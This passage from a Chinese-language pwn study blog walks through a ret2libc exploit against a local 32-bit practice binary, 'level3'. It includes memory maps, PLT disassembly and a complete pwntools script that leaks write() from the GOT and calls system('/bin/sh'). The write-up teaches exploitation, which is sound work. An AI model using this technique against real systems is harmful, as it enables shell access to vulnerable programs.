<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">lamecrow@LAPTOP-PUE31HT9:/mnt/e/Try/DownLoad/PWN/Learn/ZMspark/X86_ROP/level3$ python3 exploit.py</span><br><span class="line">[+] Starting local process <span class="string">&#x27;./level3&#x27;</span>: pid <span class="number">9736</span></span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> reading in interactive</span><br><span class="line">$</span><br><span class="line">[*] Process <span class="string">&#x27;./level3&#x27;</span> stopped with exit code <span class="number">-11</span> (SIGSEGV) (pid <span class="number">9736</span>)</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> sending in interactive</span><br></pre></td></tr></table></figure>

<h3 id="debug脚本"><a href="#debug脚本" class="headerlink" title="debug脚本"></a>debug脚本</h3><p>编写一个测试用的pwntools脚本</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span> from pwn <span class="keyword">import</span> *</span><br><span class="line"> <span class="number">2</span></span><br><span class="line"> <span class="number">3</span> conn = <span class="built_in">process</span>(<span class="string">&quot;./level3&quot;</span>)</span><br><span class="line"> <span class="number">4</span></span><br><span class="line"> <span class="number">5</span> payload = b<span class="number">&#x27;</span>A<span class="number">&#x27;</span></span><br><span class="line"> <span class="number">6</span></span><br><span class="line"> <span class="number">7</span> <span class="built_in">pause</span>()</span><br><span class="line"> <span class="number">8</span></span><br><span class="line"> <span class="number">9</span> conn.<span class="built_in">sendline</span>(payload)</span><br><span class="line"><span class="number">10</span></span><br><span class="line"><span class="number">11</span> conn.<span class="built_in">interactive</span>()</span><br></pre></td></tr></table></figure>

<h3 id="进程1地址空间"><a href="#进程1地址空间" class="headerlink" title="进程1地址空间"></a>进程1地址空间</h3><p>然后查看其maps文件</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">lamecrow@LAPTOP-PUE31HT9:/mnt/c/Users/<span class="number">17495</span>$ sudo cat /proc/<span class="number">19314</span>/maps</span><br><span class="line">[sudo] password <span class="keyword">for</span> lamecrow:</span><br><span class="line"><span class="number">08048000</span><span class="number">-08049000</span> r--p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">4</span>c <span class="number">56013520365443640</span>                  /mnt/e/Try/DownLoad/PWN/Learn/ZMspark/X86_ROP/level3/level3</span><br><span class="line"><span class="number">08049000</span><span class="number">-0804</span>a000 r-xp <span class="number">00001000</span> <span class="number">00</span>:<span class="number">4</span>c <span class="number">56013520365443640</span>                  /mnt/e/Try/DownLoad/PWN/Learn/ZMspark/X86_ROP/level3/level3</span><br><span class="line"><span class="number">0804</span>a000<span class="number">-0804b</span>000 r--p <span class="number">00002000</span> <span class="number">00</span>:<span class="number">4</span>c <span class="number">56013520365443640</span>                  /mnt/e/Try/DownLoad/PWN/Learn/ZMspark/X86_ROP/level3/level3</span><br><span class="line"><span class="number">0804b</span>000<span class="number">-0804</span>c000 r--p <span class="number">00002000</span> <span class="number">00</span>:<span class="number">4</span>c <span class="number">56013520365443640</span>                  /mnt/e/Try/DownLoad/PWN/Learn/ZMspark/X86_ROP/level3/level3</span><br><span class="line"><span class="number">0804</span>c000<span class="number">-0804</span>d000 rw-p <span class="number">00003000</span> <span class="number">00</span>:<span class="number">4</span>c <span class="number">56013520365443640</span>                  /mnt/e/Try/DownLoad/PWN/Learn/ZMspark/X86_ROP/level3/level3</span><br><span class="line">f7d2e000-f7d4e000 r--p <span class="number">00000000</span> <span class="number">08</span>:<span class="number">20</span> <span class="number">23205</span>                              /usr/lib/i386-linux-gnu/libc.so<span class="number">.6</span></span><br><span class="line">f7d4e000-f7ed0000 r-xp <span class="number">00020000</span> <span class="number">08</span>:<span class="number">20</span> <span class="number">23205</span>                              /usr/lib/i386-linux-gnu/libc.so<span class="number">.6</span></span><br><span class="line">f7ed0000-f7f55000 r--p <span class="number">001</span>a2000 <span class="number">08</span>:<span class="number">20</span> <span class="number">23205</span>                              /usr/lib/i386-linux-gnu/libc.so<span class="number">.6</span></span><br><span class="line">f7f55000-f7f56000 ---p <span class="number">00227000</span> <span class="number">08</span>:<span class="number">20</span> <span class="number">23205</span>                              /usr/lib/i386-linux-gnu/libc.so<span class="number">.6</span></span><br><span class="line">f7f56000-f7f58000 r--p <span class="number">00227000</span> <span class="number">08</span>:<span class="number">20</span> <span class="number">23205</span>                              /usr/lib/i386-linux-gnu/libc.so<span class="number">.6</span></span><br><span class="line">f7f58000-f7f59000 rw-p <span class="number">00229000</span> <span class="number">08</span>:<span class="number">20</span> <span class="number">23205</span>                              /usr/lib/i386-linux-gnu/libc.so<span class="number">.6</span></span><br><span class="line">f7f59000-f7f63000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span></span><br><span class="line">f7f6d000-f7f6f000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span></span><br><span class="line">f7f6f000-f7f73000 r--p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span>                                  [vvar]</span><br><span class="line">f7f73000-f7f75000 r-xp <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span>                                  [vdso]</span><br><span class="line">f7f75000-f7f76000 r--p <span class="number">00000000</span> <span class="number">08</span>:<span class="number">20</span> <span class="number">23192</span>                              /usr/lib/i386-linux-gnu/ld-linux.so<span class="number">.2</span></span><br><span class="line">f7f76000-f7f9b000 r-xp <span class="number">00001000</span> <span class="number">08</span>:<span class="number">20</span> <span class="number">23192</span>                              /usr/lib/i386-linux-gnu/ld-linux.so<span class="number">.2</span></span><br><span class="line">f7f9b000-f7faa000 r--p <span class="number">00026000</span> <span class="number">08</span>:<span class="number">20</span> <span class="number">23192</span>                              /usr/lib/i386-linux-gnu/ld-linux.so<span class="number">.2</span></span><br><span class="line">f7faa000-f7fac000 r--p <span class="number">00034000</span> <span class="number">08</span>:<span class="number">20</span> <span class="number">23192</span>                              /usr/lib/i386-linux-gnu/ld-linux.so<span class="number">.2</span></span><br><span class="line">f7fac000-f7fad000 rw-p <span class="number">00036000</span> <span class="number">08</span>:<span class="number">20</span> <span class="number">23192</span>                              /usr/lib/i386-linux-gnu/ld-linux.so<span class="number">.2</span></span><br><span class="line">ffe75000-ffe97000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span>                                  [stack]</span><br></pre></td></tr></table></figure>

<h3 id="进程2地址空间"><a href="#进程2地址空间" class="headerlink" title="进程2地址空间"></a>进程2地址空间</h3><p>动态库与进程1的地址空间不同, <strong>但是level3程序本身在虚拟内存中的位置是固定的</strong>.</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">lamecrow@LAPTOP-PUE31HT9:/mnt/c/Users/<span class="number">17495</span>$ sudo cat /proc/<span class="number">19863</span>/maps</span><br><span class="line"><span class="number">08048000</span><span class="number">-08049000</span> r--p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">4</span>c <span class="number">56013520365443640</span>                  /mnt/e/Try/DownLoad/PWN/Learn/ZMspark/X86_ROP/level3/level3</span><br><span class="line"><span class="number">08049000</span><span class="number">-0804</span>a000 r-xp <span class="number">00001000</span> <span class="number">00</span>:<span class="number">4</span>c <span class="number">56013520365443640</span>                  /mnt/e/Try/DownLoad/PWN/Learn/ZMspark/X86_ROP/level3/level3</span><br><span class="line"><span class="number">0804</span>a000<span class="number">-0804b</span>000 r--p <span class="number">00002000</span> <span class="number">00</span>:<span class="number">4</span>c <span class="number">56013520365443640</span>                  /mnt/e/Try/DownLoad/PWN/Learn/ZMspark/X86_ROP/level3/level3</span><br><span class="line"><span class="number">0804b</span>000<span class="number">-0804</span>c000 r--p <span class="number">00002000</span> <span class="number">00</span>:<span class="number">4</span>c <span class="number">56013520365443640</span>                  /mnt/e/Try/DownLoad/PWN/Learn/ZMspark/X86_ROP/level3/level3</span><br><span class="line"><span class="number">0804</span>c000<span class="number">-0804</span>d000 rw-p <span class="number">00003000</span> <span class="number">00</span>:<span class="number">4</span>c <span class="number">56013520365443640</span>                  /mnt/e/Try/DownLoad/PWN/Learn/ZMspark/X86_ROP/level3/level3</span><br><span class="line">f7cff000-f7d1f000 r--p <span class="number">00000000</span> <span class="number">08</span>:<span class="number">20</span> <span class="number">23205</span>                              /usr/lib/i386-linux-gnu/libc.so<span class="number">.6</span></span><br><span class="line">f7d1f000-f7ea1000 r-xp <span class="number">00020000</span> <span class="number">08</span>:<span class="number">20</span> <span class="number">23205</span>                              /usr/lib/i386-linux-gnu/libc.so<span class="number">.6</span></span><br><span class="line">f7ea1000-f7f26000 r--p <span class="number">001</span>a2000 <span class="number">08</span>:<span class="number">20</span> <span class="number">23205</span>                              /usr/lib/i386-linux-gnu/libc.so<span class="number">.6</span></span><br><span class="line">f7f26000-f7f27000 ---p <span class="number">00227000</span> <span class="number">08</span>:<span class="number">20</span> <span class="number">23205</span>                              /usr/lib/i386-linux-gnu/libc.so<span class="number">.6</span></span><br><span class="line">f7f27000-f7f29000 r--p <span class="number">00227000</span> <span class="number">08</span>:<span class="number">20</span> <span class="number">23205</span>                              /usr/lib/i386-linux-gnu/libc.so<span class="number">.6</span></span><br><span class="line">f7f29000-f7f2a000 rw-p <span class="number">00229000</span> <span class="number">08</span>:<span class="number">20</span> <span class="number">23205</span>                              /usr/lib/i386-linux-gnu/libc.so<span class="number">.6</span></span><br><span class="line">f7f2a000-f7f34000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span></span><br><span class="line">f7f3e000-f7f40000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span></span><br><span class="line">f7f40000-f7f44000 r--p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span>                                  [vvar]</span><br><span class="line">f7f44000-f7f46000 r-xp <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span>                                  [vdso]</span><br><span class="line">f7f46000-f7f47000 r--p <span class="number">00000000</span> <span class="number">08</span>:<span class="number">20</span> <span class="number">23192</span>                              /usr/lib/i386-linux-gnu/ld-linux.so<span class="number">.2</span></span><br><span class="line">f7f47000-f7f6c000 r-xp <span class="number">00001000</span> <span class="number">08</span>:<span class="number">20</span> <span class="number">23192</span>                              /usr/lib/i386-linux-gnu/ld-linux.so<span class="number">.2</span></span><br><span class="line">f7f6c000-f7f7b000 r--p <span class="number">00026000</span> <span class="number">08</span>:<span class="number">20</span> <span class="number">23192</span>                              /usr/lib/i386-linux-gnu/ld-linux.so<span class="number">.2</span></span><br><span class="line">f7f7b000-f7f7d000 r--p <span class="number">00034000</span> <span class="number">08</span>:<span class="number">20</span> <span class="number">23192</span>                              /usr/lib/i386-linux-gnu/ld-linux.so<span class="number">.2</span></span><br><span class="line">f7f7d000-f7f7e000 rw-p <span class="number">00036000</span> <span class="number">08</span>:<span class="number">20</span> <span class="number">23192</span>                              /usr/lib/i386-linux-gnu/ld-linux.so<span class="number">.2</span></span><br><span class="line">fff89000-fffab000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span></span><br></pre></td></tr></table></figure>

<h2 id="ASLR破解思路"><a href="#ASLR破解思路" class="headerlink" title="ASLR破解思路"></a>ASLR破解思路</h2><ul>
<li>首先泄漏libc.so某些函数在内存中的地址</li>
<li>根据泄漏的函数地址 + 偏移量计算出system()函数和”/bin/sh”字符串在内存中的地址</li>
<li>栈, libc, heap的地址都是随机的, 但是<strong>程序的内存地址是固定的</strong> (这个在maps文件中也体现了, 观察上面的两个maps文件, 发现对level3的映射是固定的)</li>
<li>可以通过GOT表找到write()函数地址, 然后根据固定的偏移找到system()函数</li>
</ul>
<p><img src="/2024/01/12/ROP_x86_a0faa06e633cf917e7233b696ff7200f/image-20230923005215-5c6d1x5.png" alt="image"></p>
<h2 id="使用objdump查看PLT信息"><a href="#使用objdump查看PLT信息" class="headerlink" title="使用objdump查看PLT信息"></a>使用objdump查看PLT信息</h2><p>查看objdump的plt表反汇编数据, 因为<strong>system和read, write都位于libc中</strong>, 属于导入函数, 需要使用plt表, 所以首先查看plt表的信息.</p>
<p>由于程序本身没有调用system, 可以先找到write(read也行)函数的地址, 然后通过固定的偏移找到system()函数.</p>
<p>这里涉及到了延时绑定技术, 在CSAPP和程序员的自我修养中都有提到, CSAPP较为简洁, 但是也够用了.</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">lamecrow@LAPTOP-PUE31HT9:/mnt/e/Try/DownLoad/PWN/Learn/ZMspark/X86_ROP/level3$ objdump -d -j .plt level3</span><br><span class="line"></span><br><span class="line">level3:     file format elf32-i386</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .plt:</span><br><span class="line"></span><br><span class="line"><span class="number">08049030</span> &lt;__libc_start_main@plt<span class="number">-0x10</span>&gt;:                                             <span class="comment">// 特殊条目, 用来跳转到动态连接器中. 所以它没有符号, 而是用__libc_start_main@plt加上一个偏移值表示</span></span><br><span class="line"> <span class="number">8049030</span>:       ff <span class="number">35</span> <span class="number">04</span> c0 <span class="number">04</span> <span class="number">08</span>       push   <span class="number">0x804c004</span></span><br><span class="line"> <span class="number">8049036</span>:       ff <span class="number">25</span> <span class="number">08</span> c0 <span class="number">04</span> <span class="number">08</span>       jmp    *<span class="number">0x804c008</span></span><br><span class="line"> <span class="number">804903</span>c:       <span class="number">00</span> <span class="number">00</span>                   add    %al,(%eax)</span><br><span class="line">        ...</span><br><span class="line"></span><br><span class="line"><span class="number">08049040</span> &lt;__libc_start_main@plt&gt;:</span><br><span class="line"> <span class="number">8049040</span>:       ff <span class="number">25</span> <span class="number">0</span>c c0 <span class="number">04</span> <span class="number">08</span>       jmp    *<span class="number">0x804c00c</span></span><br><span class="line"> <span class="number">8049046</span>:       <span class="number">68</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          push   $<span class="number">0x0</span></span><br><span class="line"> <span class="number">804904b</span>:       e9 e0 ff ff ff          jmp    <span class="number">8049030</span> &lt;_init+<span class="number">0x30</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="number">08049050</span> &lt;read@plt&gt;:</span><br><span class="line"> <span class="number">8049050</span>:       ff <span class="number">25</span> <span class="number">10</span> c0 <span class="number">04</span> <span class="number">08</span>       jmp    *<span class="number">0x804c010</span></span><br><span class="line"> <span class="number">8049056</span>:       <span class="number">68</span> <span class="number">08</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          push   $<span class="number">0x8</span></span><br><span class="line"> <span class="number">804905b</span>:       e9 d0 ff ff ff          jmp    <span class="number">8049030</span> &lt;_init+<span class="number">0x30</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="number">08049060</span> &lt;write@plt&gt;:</span><br><span class="line"> <span class="number">8049060</span>:       ff <span class="number">25</span> <span class="number">14</span> c0 <span class="number">04</span> <span class="number">08</span>       jmp    *<span class="number">0x804c014</span></span><br><span class="line"> <span class="number">8049066</span>:       <span class="number">68</span> <span class="number">10</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>          push   $<span class="number">0x10</span></span><br><span class="line"> <span class="number">804906b</span>:       e9 c0 ff ff ff          jmp    <span class="number">8049030</span> &lt;_init+<span class="number">0x30</span>&gt;</span><br></pre></td></tr></table></figure>

<h2 id="查看链接信息"><a href="#查看链接信息" class="headerlink" title="查看链接信息"></a>查看链接信息</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lamecrow@LAPTOP-PUE31HT9:/mnt/e/Try/DownLoad/PWN/Learn/ZMspark/X86_ROP/level3$ ldd level3</span><br><span class="line">        linux-gate.so<span class="number">.1</span> (<span class="number">0xf7f36000</span>)</span><br><span class="line">        libc.so<span class="number">.6</span> =&gt; /lib/i386-linux-gnu/libc.so<span class="number">.6</span> (<span class="number">0xf7cf1000</span>)</span><br><span class="line">        /lib/ld-linux.so<span class="number">.2</span> (<span class="number">0xf7f38000</span>)</span><br></pre></td></tr></table></figure>

<p>找到动态库文件后, 将其复制到当前文件夹, 方便后续使用.</p>
<h2 id="编写exploit-1"><a href="#编写exploit-1" class="headerlink" title="编写exploit"></a>编写exploit</h2><p>分步解析exploit.py文件</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span> from pwn <span class="keyword">import</span> *</span><br><span class="line"> <span class="number">2</span></span><br><span class="line"> <span class="number">3</span> libc = <span class="built_in">ELF</span>(<span class="string">&quot;libc.so&quot;</span>)</span><br><span class="line"> <span class="number">4</span> elf = <span class="built_in">ELF</span>(<span class="string">&quot;level3&quot;</span>)</span><br><span class="line"> <span class="number">5</span></span><br><span class="line"> <span class="number">6</span> conn = <span class="built_in">process</span>(<span class="string">&quot;./level3&quot;</span>)</span><br><span class="line"> <span class="number">7</span></span><br><span class="line"> <span class="number">8</span> # 打印PLT表中, <span class="built_in">write</span>()函数对应的条目地址</span><br><span class="line"> <span class="number">9</span> # 打印出来的地址可以到objdump中验证, 可以发现与PLT表中对应条目的地址相同</span><br><span class="line"><span class="number">10</span> plt_write = elf.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"><span class="number">11</span> <span class="built_in">print</span>(<span class="string">&#x27;plt_write = &#x27;</span> + <span class="built_in">hex</span>(plt_write))</span><br><span class="line"><span class="number">12</span></span><br><span class="line"><span class="number">13</span> # 打印GOT表中, <span class="built_in">write</span>()函数对应的地址</span><br><span class="line"><span class="number">14</span> # 打印出来的地址可以到objdump中验证, 与PLT表中第一个JMP的跳转地址相同</span><br><span class="line"><span class="number">15</span> got_write = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"><span class="number">16</span> <span class="built_in">print</span>(<span class="string">&#x27;got_write = &#x27;</span> + <span class="built_in">hex</span>(got_write))</span><br><span class="line"><span class="number">17</span></span><br><span class="line"><span class="number">18</span> # <span class="built_in">vulnable_function</span>()的地址通过gdb或IDA查看</span><br><span class="line"><span class="number">19</span> vulfun_addr = <span class="number">0x08049186</span></span><br><span class="line"><span class="number">20</span> <span class="built_in">print</span>(<span class="string">&#x27;vulfun = &#x27;</span> + <span class="built_in">hex</span>(vulfun_addr))</span><br><span class="line"><span class="number">21</span></span><br><span class="line"><span class="number">22</span> # 填充 + 目标函数地址 + 返回地址 + 参数列表(<span class="number">1</span>, got_write地址, <span class="number">4</span>)</span><br><span class="line"><span class="number">23</span> # 实际上就是调用了<span class="built_in">write</span>(<span class="number">1</span>, got_write绝对地址, <span class="number">4</span>), 把运行中的<span class="built_in">write</span>()绝对地址输出到st    d_out中, 这样就可以接收得知函数地址</span><br><span class="line"><span class="number">24</span> payload1 = b<span class="number">&#x27;</span>a<span class="number">&#x27;</span> * <span class="number">140</span> + <span class="built_in">p32</span>(plt_write) + <span class="built_in">p32</span>(vulfun_addr) + <span class="built_in">p32</span>(<span class="number">1</span>) + <span class="built_in">p32</span>(got_write)     + <span class="built_in">p32</span>(<span class="number">4</span>)</span><br><span class="line"><span class="number">25</span></span><br><span class="line"><span class="number">26</span> # 输入payload</span><br><span class="line"><span class="number">27</span> <span class="built_in">print</span>(<span class="string">&quot;\n###sending payload1...###&quot;</span>)</span><br><span class="line"><span class="number">28</span> conn.<span class="built_in">send</span>(payload1)</span><br><span class="line"><span class="number">29</span></span><br><span class="line"><span class="number">30</span> # 通过<span class="built_in">write</span>()函数, 标准输出了<span class="built_in">write</span>(()函数的绝对地址</span><br><span class="line"><span class="number">31</span> <span class="built_in">print</span>(<span class="string">&quot;\n###receving write() addr...###&quot;</span>)</span><br><span class="line"><span class="number">32</span> write_addr = <span class="built_in">u32</span>(conn.<span class="built_in">recv</span>(<span class="number">4</span>))</span><br><span class="line"><span class="number">33</span> <span class="built_in">print</span>(<span class="string">&#x27;write_addr = &#x27;</span> + <span class="built_in">hex</span>(write_addr))</span><br><span class="line"><span class="number">34</span></span><br><span class="line"><span class="number">35</span> <span class="built_in">print</span>(<span class="string">&quot;\n###calculating system() addr and \&quot;/bin/sh\&quot; addr...###&quot;</span>)</span><br><span class="line"><span class="number">36</span></span><br><span class="line"><span class="number">37</span> # 首先获取库基址, 然后再加上system的偏移, 得到了实际<span class="built_in">system</span>()的实际地址</span><br><span class="line"><span class="number">38</span> system_addr = write_addr - libc.symbols[<span class="string">&#x27;write&#x27;</span>] + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="number">39</span> <span class="built_in">print</span>(<span class="string">&#x27;system_addr = &#x27;</span> + <span class="built_in">hex</span>(system_addr))</span><br><span class="line"><span class="number">40</span></span><br><span class="line"><span class="number">41</span> # 搜索elf文件libc库, 与上面同理</span><br><span class="line"><span class="number">42</span> binsh_addr = write_addr - libc.symbols[<span class="string">&#x27;write&#x27;</span>] + <span class="built_in">next</span>(libc.<span class="built_in">search</span>(b<span class="number">&#x27;</span>/bin/sh<span class="number">&#x27;</span>))</span><br><span class="line"><span class="number">43</span> <span class="built_in">print</span>(<span class="string">&#x27;binsh_addr = &#x27;</span> + <span class="built_in">hex</span>(binsh_addr))</span><br><span class="line"><span class="number">44</span></span><br><span class="line"><span class="number">45</span> # 由于上一次payload最终又返回了vulfun, 所以又再一次读取, 这一次构造system调用和sh的    字符串地址</span><br><span class="line"><span class="number">46</span> payload2 = b<span class="number">&#x27;</span>a<span class="number">&#x27;</span> * <span class="number">140</span> + <span class="built_in">p32</span>(system_addr) + <span class="built_in">p32</span>(vulfun_addr) + <span class="built_in">p32</span>(binsh_addr)    </span><br><span class="line"><span class="number">47</span></span><br><span class="line"><span class="number">48</span> <span class="built_in">print</span>(<span class="string">&quot;\n###sending payload2...###&quot;</span>)</span><br><span class="line"><span class="number">49</span> conn.<span class="built_in">send</span>(payload2)</span><br><span class="line"><span class="number">50</span></span><br><span class="line"><span class="number">51</span> conn.<span class="built_in">interactive</span>()</span><br></pre></td></tr></table></figure>


<p>[^2]: # Core Dump环境</p>
<pre><code># 配置代码

来自: 确定payload偏移[^3]

<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ulimit -c unlimited</span><br><span class="line">sudo sh -c <span class="string">&#x27;echo &quot;/tmp/core/core.%t&quot; &gt; /proc/sys/kernel/core_pattern&#x27;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ulimit -c unlimited</span><br><span class="line"># 解除core文件的大小限制</span><br><span class="line">sudo sh -c <span class="string">&#x27;echo &quot;/tmp/core/core.%t&quot; &gt; /proc/sys/kernel/core_pattern&#x27;</span></span><br><span class="line"># 使用默认的shell执行 echo <span class="string">&quot;/tmp/core.%t&quot;</span> &gt; /proc/sys/kernel/core_pattern 命令</span><br><span class="line">所以上述的命令是将/tmp/core.%t输出到/proc/sys/kernel/core_pattern文件中</span><br><span class="line">而core_pattern文件的功能是: 其文件内容就是core文件的文件名</span><br></pre></td></tr></table></figure>
# 指令解析

## ulimit

ulimit命令用于限制用户的资源使用, 基本为两种形式:

* ​`ulimit &lt;指定资源&gt; &lt;number&gt;`​: 对目标资源进行具体数量上的限制
* ​`ulimit &lt;指定资源&gt; unlimited`​: 对目标资源不进行限制

资源参数:

*  **-c: core文件的最大值, 单位为区块**
* -d: 数据段
* -m: 最大内存
* -s: 堆栈大小
* -t: CPU时间
* -v: 虚拟内存

## sh

调用默认shell并使用其语法和标志, 链接至/usr/bin/sh是默认的shell. (在我自己的环境中使用的是zsh)

## echo

将参数输出到目标文件中, 默认是标准输出.
</code></pre>
<p>[^3]: ## 确定payload偏移</p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">LamのCrow</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2024/01/12/ROP_x86_a0faa06e633cf917e7233b696ff7200f/">http://example.com/2024/01/12/ROP_x86_a0faa06e633cf917e7233b696ff7200f/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com">LamのCrow</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/pwn/">pwn</a></div><nav id="pagination"><div class="next-post pull-right"><a href="/2023/06/09/MagiskPrinciple/"><span>Magisk原理分析(未完待续)</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://s4.ax1x.com/2021/12/06/oy2VdH.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2021 - 2024 By LamのCrow</div><div class="framework-info"><span>驱动 - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="footer_custom_text">追求幸福</div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/lib/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script 